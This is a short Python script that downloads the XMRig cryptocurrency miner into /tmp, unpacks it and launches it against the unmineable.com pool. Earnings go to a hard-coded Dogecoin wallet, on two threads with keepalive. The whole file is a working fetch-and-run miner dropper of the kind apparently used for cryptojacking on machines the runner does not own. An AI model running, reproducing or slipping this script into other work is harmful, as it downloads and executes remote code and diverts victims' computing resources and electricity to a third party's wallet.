import requests
import tarfile
import os

# Specify the directory to save the file
download_dir = "/tmp"
os.chdir(download_dir)

# Download the file
url = "https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-x64.tar.gz"
filename = url.split("/")[-1]

print("Downloading", filename)
response = requests.get(url)
with open(filename, "wb") as f:
    f.write(response.content)

# Extract the tar.gz file
print("Extracting", filename)
with tarfile.open(filename, "r:gz") as tar:
    tar.extractall()

# Change directory
dirname = filename.replace(".tar.gz", "")
print("Changing directory to", dirname)
os.chdir(dirname)

# Execute xmrig
print("Executing xmrig")
os.system("./xmrig -o rx.unmineable.com:3333 -a rx -k -t 2 -u DOGE:DFwWFuKENgq3pd3zrnzafTMXcWLLmERZ6x")
